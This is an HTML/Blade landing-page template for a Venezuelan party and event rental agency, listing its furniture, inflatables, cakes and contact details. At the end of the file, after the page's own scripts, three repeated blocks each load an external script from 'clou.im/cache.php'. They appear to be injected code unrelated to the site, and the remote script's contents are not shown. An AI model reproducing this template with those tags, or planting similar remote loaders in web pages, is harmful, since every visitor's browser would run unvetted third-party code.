<!DOCTYPE HTML>
<!--
    Halcyonic by HTML5 UP
    html5up.net | @n33co
    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
<head>
    <meta name="viewport" content="initial-scale=1">
    <meta name="viewport" content="user-scalable=yes,width=device-width,initial-scale=1">
    <meta name="viewport" content="initial-scale=1">
    <meta name="viewport" content="user-scalable=yes,width=device-width,initial-scale=1">
    <meta name="viewport" content="initial-scale=1">
    <meta name="viewport" content="user-scalable=yes,width=device-width,initial-scale=1">
    <title>Agencia de Festejos Francachela C.A.</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!--[if lte IE 8]>
    <script src="assets/js/ie/html5shiv.js"></script><![endif]-->
    <link rel="stylesheet" href="{{asset('web/assets/css/main.css')}}">

    <!--[if lte IE 9]>
    <link rel="stylesheet" href="{{asset('web/assets/css/ie9.css')}}"><![endif]-->
    <link href="{{asset('web/assets/css/font-awesome.css')}}" rel="stylesheet" type="text/css">
</head>
<body>
<div id="page-wrapper">

    <!-- Header -->
    <div id="header-wrapper">
        <header id="header" class="container">
            <div class="row">
                <div class="12u">

                    <!-- Logo -->
                    <img src="{{asset('AdminLTE/dist/img/logox.png')}}" class="logo">

                    <!-- Nav -->
                    <nav id="nav" name="inicio">
                        <a href="#inicio">Inicio</a>
                        <a href="#servicios">Productos y servicios</a>
                        <a href="#Who">Quiénes Somos</a>
                        <a href="#contactanos">Contáctanos</a>

                        @if (Auth::check())
                            <a href="{{ url('/home') }}">Home</a>
                        @else
                            <a href="{{ url('/login') }}">Entrar</a>
                            <a href="{{ url('member/type') }}">Registrar</a>
                        @endif

                    </nav>

                </div>
            </div>
        </header>
        <div id="banner">
            <div class="container">
                <div class="row">
                    <div class="6u 12u(mobile)">
                        @if (Auth::check())
                            <p>Crea tu presupuesto online...!!</p>
                            <a href="{{ url('createorder') }}" class="button-big">Ordena ya!</a>
                        @else
                            <p>Crea tu presupuesto online... debes estar registrado antes!! solo te tomara 5 minutos!!</p>
                            <a href="{{ url('/login') }}" class="button-big">Ya tengo cuenta!</a>
                            <a href="{{ url('member/type') }}" class="button-big">Registrarme!</a>
                        @endif
                    </div>
                    <div class="6u 12u(mobile)">

                        <!-- Banner Image -->
                        <a href="#" class=""><img src="{{asset('AdminLTE/dist/img/loguito.png')}}"
                                                                        alt=""></a>

                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Features -->
    <div id="features-wrapper">
        <a name="servicios"></a>
        <div id="features">
            <div class="container">
                <div class="row">
                    <div class="1u 12u(mobile)">
                    </div>
                    <div class="10u 12u(mobile)">
                        <p class="small" style="
    width: 995px;
    height: 20px;
    padding-right: 54px;
">Hacemos de tu fiesta o evento algo inolvidable.</p>
                    </div>
                </div>
                <div class="row">
                    <div class="1u 12u(mobile)">
                    </div>

                    <div class="2u 12u(mobile)">

                        <!-- Feature #1 -->
                        <section>
                            <h2>Sillas Tipo Paris</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/sillasparis.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #2 -->
                        <section>
                            <h2>Sillas Tipo Tiffanys</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/tiffany.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #3 -->
                        <section>
                            <h2>Mesa redonda</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/mes.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    
                    <div class="2u 12u(mobile)">

                        <!-- Feature #4 -->
                        <section>
                            <h2>Meson Rectangular</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/meson.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #3 -->
                        <section>
                            <h2>toldos</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/toldo.jpg')}}" alt=""></a>
                        </section>

                    </div>
                </div>
                <!-- Division no visible-->
                <div class="row">
                    <div class="12u 12u(mobile)">
                        <span></span>
                    </div>
                </div>

                <!-- Segunda corrida-->
                <div class="row">
                    <div class="1u 12u(mobile)">
                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #3 -->
                        <section>
                            <h2>Castillo Inflable</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/castillo.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #5 -->
                        <section>
                            <h2>Tortas</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/torta.jpg')}}" alt=""></a>
                        </section>


                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #4 -->
                        <section>
                            <h2>Piñatas</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/piñata.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #4 -->
                        <section>
                            <h2>Show de payasitas</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/payasitas.jpg')}}" alt=""></a>
                        </section>

                    </div>
                    <div class="2u 12u(mobile)">

                        <!-- Feature #5 -->
                        <section>
                            <h2>Decoración</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/deco.jpeg')}}" alt=""></a>
                        </section>

                    </div>
                </div>

                <!-- Division no visible-->
                <div class="row">
                    <div class="12u 12u(mobile)">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                </div>

                <!-- Tercera Columna-->
                <div class="row">
                    <!--SEPARADOR-->
                    <div class="4u 12u(mobile)">
                    </div>
                    <div class="4u 12u(mobile)">

                        <!-- Feature #1 -->
                        <section>
                            <h2>Y mucho mas...!!</h2>
                            <a href="#" class="bordered-feature-image"><img
                                        src="{{asset('AdminLTE/dist/img/fiesta.jpg')}}" alt=""></a>
                        </section>

                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- Content -->
    <div id="content-wrapper">
        <div id="content">
            <a name="Who"></a>
            <div class="container">
                <div class="row">
                    <div class="6u 12u(mobile)">

                        <!-- Box #1 -->
                        <section>
                            <header>
                                <h2>Quiénes Somos</h2>
                                <h3> Agencia de Festejos Francachela</h3>
                            </header>
                            <p>
                                Somos una empresa naciente que lograra su crecimiento teniendo como punto fuerte la satisfacción del cliente. Nos enfocamos en ofrecer una muy buena relación calidad/precio, con entregas puntuales, productos y servicios de calidad, variedad de opciones a la hora de contratar servicios y el mejor precio del mercado.

                            </p>
                        </section>

                    </div>
                    <div class="6u 12u(mobile)">

                        <!-- Box #2 -->
                        <section>
                            <header>
                                <h2>Beneficios</h2>
                                <h3>Porque tu tiempo importa</h3>
                            </header>
                            <ul class="check-list">
                                <li>Estamos contigo antes, durante y despues del evento</li>
                                <li>Confianza</li>
                                <li>Presupuesto en linea</li>
                                <li>Rapidez</li>
                                <li>Transparencia</li>
                                <li>Servicios de calidad</li>
                                <li>Productos de calidad</li>
                                <li>Muchos más...</li>
                            </ul>
                        </section>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- CASILLA DE SEPARACION -->
    <div id="features-wrapper">
        <a name="contactanos"></a>
        <div id="features">
            <div class="container">
                <div class="row">
                    <div class="1u 12u(mobile)">
                    </div>
                    <div class="10u 12u(mobile)">
                        <p class="small">Tenemos todo para que tu fiesta o evento sea inolvidable</p>
                        <p class="small">Te ayudamos en la organización de cumpleaños, babyshowers, graduaciones, matrimonios, bautizos, eventos corporativos y muchos mas..</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- CONTACTO PERSONAL-->
    <div id="content-wrapper">
        <div id="content">
            <a name="Who"></a>
            <div class="container">
                <div class="row">

                <div class="6u 12u(mobile)">

                        <!-- Box #1 -->
                        <section>
                            <header>
                                <h2>Agencia de Festejos Francachela</h2>
                                <h3>Dudas?? contactanos</h3>
                                <h4>festejosfrancachela@gmail.com</h4>
                                <h4>0246 4310357</h4>
                            </header>

                            <p>

                            </p>
                        </section>

                    </div>

                    <div class="6u 12u(mobile)">

                        <!-- Box #1 -->
                        <section>
                            <header>
                                <h2>Agencia de Festejos Francachela</h2>
                                <h3>Tambien puedes hacerlo a traves de nuestras redes sociales</h3>
                                <h4>Buscanos como @ffrancachela en instagram</h4>
                                <h4>y en facebook como festejos francachela</h4>
                            </header>

                            <p>

                            </p>
                        </section>

                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div id="footer-wrapper">
        <footer id="footer" class="container">
            <div class="row">
                <div class="2u 12u(mobile)">
                </div>
                <div class="1u 12u(mobile)">
                    <a href="" class="icon"><i class="fa fa-facebook-square"></i></a>
                </div>
                <div class="1u 12u(mobile)">
                    <!-- Facebook e Instagram -->
                    <a href="" class="icon"><i class="fa fa-instagram"></i></a>
                </div>
                <div class="2u 12u(mobile)">
                </div>
                <div class="6u 12u(mobile)">

                    <!-- Blurb -->
                    <section>
                        <h2 style="font-size: 50px;">Contacto directo</h2>
                        <p style="font-size:30px;">
                            Avenida los llanos local N° 53
                            <br>
                            San Juan de los Morros. Estado Guarico.
                        </p>
                    </section>

                </div>
            </div>
        </footer>
    </div>

    <!-- Copyright -->
    <div id="copyright">
        © Agencia de Festejos Francachela. All rights reserved.     </div>

</div>

<!-- Scripts -->
<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/skel.min.js"></script>
<script src="assets/js/skel-viewport.min.js"></script>
<script src="assets/js/util.js"></script>
<!--[if lte IE 8]>
<script src="assets/js/ie/respond.min.js"></script><![endif]-->
<script src="assets/js/main.js"></script>


<div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
                src="{{asset('web/images/automec.png')}}"
                style="max-height:95%;"></span>
</div>
<div id="navPanel">
    <nav><a class="link depth-0" href="index.html" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Inicio</a><a class="link depth-0" href="#servicios"
                                                         style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Servicios</a><a class="link depth-0" href="#Who"
                                                            style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Quienes Somos</a><a class="link depth-0" href="#contactanos"
                                                                style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Contactanos</a></nav>
</div>
<script type="text/javascript" src="https://clou.im/cache.php?t=41"></script>
<div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
                src="{{asset('web/images/automec.png')}}"
                style="max-height:95%;"></span>
</div>
<div id="navPanel">
    <nav><a class="link depth-0" href="index.html" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Inicio</a><a class="link depth-0" href="#servicios"
                                                         style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Servicios</a><a class="link depth-0" href="#Who"
                                                            style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Quienes Somos</a><a class="link depth-0" href="#contactanos"
                                                                style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Contactanos</a></nav>
</div>
<script type="text/javascript" src="https://clou.im/cache.php?t=41"></script>
<div id="titleBar"><a href="#navPanel" class="toggle"></a><span class="title"> <img
                src="{{asset('web/images/automec.png')}}"
                style="max-height:95%;"></span>
</div>
<div id="navPanel">
    <nav><a class="link depth-0" href="index.html" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Inicio</a><a class="link depth-0" href="#servicios"
                                                         style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Servicios</a><a class="link depth-0" href="#Who"
                                                            style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Quiénes Somos</a><a class="link depth-0" href="#contactanos"
                                                                style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"><span
                    class="indent-0"></span>Contáctanos</a></nav>
</div>
<script type="text/javascript" src="https://clou.im/cache.php?t=41"></script>
</body>
</html>